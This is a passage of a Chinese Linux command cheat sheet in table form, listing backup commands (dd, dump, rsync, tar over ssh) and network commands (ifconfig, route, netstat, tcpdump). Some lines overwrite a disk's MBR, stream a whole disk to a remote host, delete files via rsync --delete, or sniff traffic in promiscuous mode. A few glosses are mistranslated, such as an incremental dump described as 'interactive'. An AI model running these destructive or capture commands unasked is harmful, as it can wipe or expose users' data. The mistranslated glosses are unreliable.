</td></tr><tr style="height:49pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # find /home/user1 -name &#39;*.txt&#39; | xargs cp -av --target-directory=/home/backup/ -

-parents
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    从一个目录查找并复制所有以<span class="s52">&#39;.txt&#39; </span>结尾的文件到另一个目录
</td></tr><tr style="height:36pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # dd bs=1M if=/dev/hda | gzip | ssh user@ip_addr &#39;dd of=hda.gz&#39;
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    通过 <span class="s52">ssh </span>在远程主机上执行一次备份本地磁盘的操作
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # dd if=/dev/sda of=/tmp/file1
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    备份磁盘内容到一个文件
</td></tr><tr style="height:36pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # dd if=/dev/hda of=/dev/fd0 bs=512 count=1
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    做一个将<span class="s52">MBR (Master Boot Record)</span>内容复制到软盘的动作
</td></tr><tr style="height:34pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # dd if=/dev/fd0 of=/dev/hda bs=512 count=1
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    从已经保存到软盘的备份中恢复<span class="s52">MBR </span>内容
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # dump -0aj -f /tmp/home0.bak /home
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    制作一个<span class="s52">&#39;/home&#39; </span>目录的完整备份
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # dump -1aj -f /tmp/home0.bak /home
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    制作一个<span class="s52">&#39;/home&#39; </span>目录的交互式备份
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # restore -if /tmp/home0.bak
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    还原一个交互式备份
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # rsync -rogpav --delete /home /tmp
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    同步两边的目录
</td></tr><tr style="height:34pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # rsync -rogpav -e ssh --delete /home ip_address:/tmp
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    通过 <span class="s52">SSH </span>通道 <span class="s52">rsync</span>
</td></tr><tr style="height:36pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # rsync -az -e ssh --delete ip_addr:/home/public /home/local
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    通过 <span class="s52">ssh </span>和压缩将一个远程目录同步到本地目录
</td></tr><tr style="height:36pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # rsync -az -e ssh --delete /home/local ip_addr:/home/public
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    通过 <span class="s52">ssh </span>和压缩将本地目录同步到远程目录
</td></tr><tr style="height:36pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # tar -Puf backup.tar /home/user
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    执行一次对<span class="s52">&#39;/home/user&#39; </span>目录的交互式备份操作
</td></tr><tr style="height:49pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # ( cd /tmp/local/ &amp;&amp; tar c . ) | ssh -C user@ip_addr &#39;cd /home/share/ &amp;&amp; tar x

-p&#39;
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    通过 <span class="s52">ssh </span>在远程目录中复制一个目录内容
</td></tr><tr style="height:34pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # ( tar c /home ) | ssh -C user@ip_addr &#39;cd

/home/backup-home &amp;&amp; tar x -p&#39;
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    通过 <span class="s52">ssh </span>在远程目录中复制一个本地目录
</td></tr><tr style="height:36pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # tar cf - . | (cd /tmp/backup ; tar xf - )
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    本地将一个目录复制到另一个地方，保留原有权限及链接
</td></tr></table><table style="border-collapse:collapse;margin-left:10.885pt" cellspacing="0"><tr style="height:21pt"><td style="width:405pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1" colspan="2">

    <a name="bookmark57">网络</a><span class="s59">(LAN / WiFi)</span>
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#505050;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    命令
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    说明
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # dhclient eth0
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    以 <span class="s52">dhcp </span>模式启用<span class="s52">&#39;eth0&#39; </span>网络设备
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # ethtool eth0
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    显示网卡<span class="s52">&#39;eth0&#39; </span>的流量统计
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    [# host www.example.com](http://www.example.com/)
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    查找主机名以解析名称与 <span class="s52">IP </span>地址及镜像
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # hostname
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    显示主机名
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # ifconfig eth0
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    显示一个以太网卡的配置
</td></tr><tr style="height:34pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # ifconfig eth0 192.168.1.1 netmask 255.255.255.0
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    控制 <span class="s52">IP </span>地址
</td></tr><tr style="height:35pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # ifconfig eth0 promisc
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    设置<span class="s52">&#39;eth0&#39; </span>成混杂模式以嗅探数据包

(sniffing)
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # ifdown eth0
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    禁用一个<span class="s52">&#39;eth0&#39; </span>网络设备
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # ifup eth0
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    启用一个<span class="s52">&#39;eth0&#39; </span>网络设备
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # ip link show
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    显示所有网络设备的连接状态
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # iwconfig eth1
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    显示一个无线网卡的配置
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # iwlist scan
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    显示无线网络
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # mii-tool eth0
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    显示<span class="s52">&#39;eth0&#39;</span>的连接状态
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # netstat -tup
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    显示所有启用的网络连接和它们的<span class="s52">PID</span>
</td></tr><tr style="height:35pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # netstat -tupl
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    显示系统中所有监听的网络服务和它们的

PID
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # netstat -rn
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    显示路由表，类似于“<span class="s52">route -n</span>”命令
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    [# nslookup www.example.com](http://www.example.com/)
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    查找主机名以解析名称与 <span class="s52">IP </span>地址及镜像
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # route -n
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    显示路由表
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # route add -net 0/0 gw IP_Gateway
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    控制预设网关
</td></tr><tr style="height:34pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # route add -net 192.168.0.0 netmask 255.255.0.0 gw 192.168.1.1
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    控制通向网络<span class="s52">&#39;192.168.0.0/16&#39; </span>的静态路由
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # route del 0/0 gw IP_gateway
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    删除静态路由
</td></tr><tr style="height:34pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # echo &quot;1&quot; &gt;

/proc/sys/net/ipv4/ip_forward
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    激活 <span class="s52">IP </span>转发
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # tcpdump tcp port 80
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    显示所有<span class="s52">HTTP </span>回环
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    [# whois www.example.com](http://www.example.com/)
